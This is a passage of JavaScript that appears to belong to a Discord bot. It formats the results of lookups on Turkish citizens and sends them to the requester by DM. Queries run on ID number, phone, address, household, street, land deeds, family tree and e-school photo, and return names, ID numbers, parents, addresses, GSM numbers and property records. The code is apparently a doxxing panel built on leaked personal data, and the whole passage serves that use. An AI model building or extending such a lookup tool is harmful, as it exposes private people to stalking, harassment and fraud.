            dmContent += `**Tip:** ${tip === 'tcsorgu' ? 'T.C. Sorgu' : 'Adres Sorgu'}\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = json.data;
              dmContent += formatTableRow('TC', d.TC) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.AD || '?'} ${d.SOYAD || '?'}`) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', d.DOGUMTARIHI) + '\n';
              dmContent += formatTableRow('Yas', d.YAS) + '\n';
              dmContent += formatTableRow('Cinsiyet', d.CINSIYET) + '\n';
              dmContent += formatTableRow('Medeni Hal', d.MEDENIHAL) + '\n';
              dmContent += formatTableRow('Anne', `${d.ANNEADI || '-'} (${d.ANNETC || '-'})`) + '\n';
              dmContent += formatTableRow('Baba', `${d.BABAADI || '-'} (${d.BABATC || '-'})`) + '\n';
              dmContent += formatTableRow('Dogum Yeri', d.DOGUMYERI) + '\n';
              dmContent += formatTableRow('Memleket', `${d.MEMLEKETIL || '-'} / ${d.MEMLEKETILCE || '-'}`) + '\n';
              dmContent += formatTableRow('Adres', d.ADRES) + '\n';
              dmContent += formatTableRow('GSM', d.GSM) + '\n';
            }
          } else if (tip === 'gsmtc') {
            dmContent += `**Tip:** GSM → T.C. Sorgu\nGSM: ${gsm}\n\n`;
            if (!json.data || !Array.isArray(json.data) || json.data.length === 0) {
              dmContent += 'Kayit bulunamadi.';
            } else {
              dmContent += `Toplam ${json.data.length} kayit:\n\n`;
              json.data.forEach((d, i) => {
                let yas = '-';
                if (d.DG) {
                  const p = d.DG.split('.');
                  if (p.length === 3) {
                    const dogum = new Date(p[2], p[1] - 1, p[0]);
                    yas = Math.floor((new Date() - dogum) / 31557600000);
                  }
                }
                dmContent += `--- Kayit ${i + 1} → ${d.ADI || '?'} ${d.SOYADI || '?'} ---\n`;
                dmContent += formatTableRow('T.C. No', d.TCKN) + '\n';
                dmContent += formatTableRow('Ad Soyad', `${d.ADI || '-'} ${d.SOYADI || '-'}`) + '\n';
                dmContent += formatTableRow('Dogum Tarihi', d.DG) + '\n';
                dmContent += formatTableRow('Yas', yas) + '\n';
                dmContent += formatTableRow('Anne', `${d.ANNEADI || '-'} (${d.ANNETCKN || '-'})`) + '\n';
                dmContent += formatTableRow('Baba', `${d.BABAADI || '-'} (${d.BABATCKN || '-'})`) + '\n';
                dmContent += formatTableRow('Il/Ilce', d.ILILCE) + '\n';
                dmContent += formatTableRow('Adres', d.ADRES) + '\n';
                dmContent += formatTableRow('GSM', d.GSM) + '\n\n';
              });
            }
          } else if (tip === 'tcgsm') {
            dmContent += `**Tip:** T.C. → GSM Sorgu\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = Array.isArray(json.data) ? json.data[0] : json.data;
              dmContent += formatTableRow('TC', d.TCKN) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.ADI || '?'} ${d.SOYADI || '?'}`) + '\n';
              dmContent += formatTableRow('GSM', d.GSM) + '\n';
            }
          } else if (tip === 'hane' || tip === 'sokak') {
            dmContent += `**Tip:** ${tip === 'hane' ? 'Hane Sorgu' : 'Sokak Sorgu'}\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              json.data.forEach(d => {
                dmContent += formatTableRow('TC', d.TCKN) + '\n';
                dmContent += formatTableRow('Adi', d.ADI) + '\n';
                dmContent += formatTableRow('Soyadi', d.SOYADI) + '\n';
                dmContent += formatTableRow('Dogum Tarihi', d.DOGUMTARİHİ) + '\n';
                dmContent += formatTableRow('Il/Ilce', d.İLİLCE) + '\n';
                dmContent += formatTableRow('Uyruk', d.UYRUK) + '\n';
                dmContent += formatTableRow('Adres', d.EVADRES) + '\n\n';
              });
            }
          } else if (tip === 'tapu') {
            dmContent += `**Tip:** Tapu Sorgu\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const k = json.data.kisi;
              dmContent += '**Kisi Bilgileri:**\n';
              dmContent += formatTableRow('TCKN', k.Tckn) + '\n';
              dmContent += formatTableRow('Adi', k.Adi) + '\n';
              dmContent += formatTableRow('Soyadi', k.Soyadi) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', k.DogumTarihi) + '\n';
              dmContent += formatTableRow('Cinsiyet', k.Cinsiyet) + '\n';
              dmContent += formatTableRow('Baba Adi', k.BabaAdi) + '\n\n';
              if (json.data.tapular && json.data.tapular.length > 0) {
                dmContent += `**Tapular (${json.data.tapular.length} adet):**\n\n`;
                json.data.tapular.forEach((t, i) => {
                  dmContent += `--- Tapu ${i + 1} ---\n`;
                  dmContent += formatTableRow('Il', t.İlBilgisi) + '\n';
                  dmContent += formatTableRow('Ilce', t.İlceBilgisi) + '\n';
                  dmContent += formatTableRow('Mahalle', t.MahalleBilgisi) + '\n';
                  dmContent += formatTableRow('Ada', t.AdaBilgisi) + '\n';
                  dmContent += formatTableRow('Parsel', t.ParselBilgisi) + '\n';
                  dmContent += formatTableRow('Nitelik', t.AnaTasinmazNitelik) + '\n';
                  dmContent += formatTableRow('Hisse', `${t.HissePay || '-'} / ${t.HissePayda || '-'}`) + '\n';
                  dmContent += formatTableRow('Edinme', t.EdinmeSebebi) + '\n';
                  dmContent += formatTableRow('Tapu Tarihi', t.TapuDate) + '\n\n';
                });
              } else {
                dmContent += 'Tapu kaydi bulunamadi.\n';
              }
            }
          } else if (tip === 'aile' || tip === 'sulale') {
            dmContent += `**Tip:** ${tip === 'aile' ? 'Aile Sorgu' : 'Soyağacı Sorgu'}\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              json.data.forEach((d, i) => {
                dmContent += `--- Kayit ${i + 1} ---\n`;
                dmContent += formatTableRow('Yakinlik', d.YAKINLIK) + '\n';
                dmContent += formatTableRow('TCKN', d.TCKN) + '\n';
                dmContent += formatTableRow('Adi', d.ADI) + '\n';
                dmContent += formatTableRow('Soyadi', d.SOYADI) + '\n';
                dmContent += formatTableRow('Dogum', d.DG) + '\n';
                dmContent += formatTableRow('Il', d.IL) + '\n';
                dmContent += formatTableRow('GSM', d.GSM) + '\n';
                dmContent += formatTableRow('Adres', d.ADRES) + '\n\n';
              });
            }
          } else if (tip === 'vesika') {
            dmContent += `**Tip:** E-Okul Vesika Sorgu\nTCKN: ${tckn}\n\n`;
            if (!json.status || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = json.data;
              dmContent += formatTableRow('TC', d.TCKN) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.ADI || '-'} ${d.SOYADI || '-'}`) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', d['DOGUMTARİHİ']) + '\n';
              if (d.VESIKA) {
                dmContent += '\n(Vesikalik fotograf base64 olarak mevcut, Discordda goruntulenemez.)\n';
              }
            }
          }

          const isLong = dmContent.length > 1900;

          const dmSent = await sendDM(userId, dmContent, env.DISCORD_TOKEN, isLong, 'kanser-sorgu-sonuc.txt');
          if (dmSent) {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'Sorgu sonucu DM\'ine gonderildi.' });
          } else {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'DM gonderilemedi. Sonuc:\n\n' + dmContent.slice(0, 1900) });
          }
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Kanser Sorgu Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
      return null;
  }
}
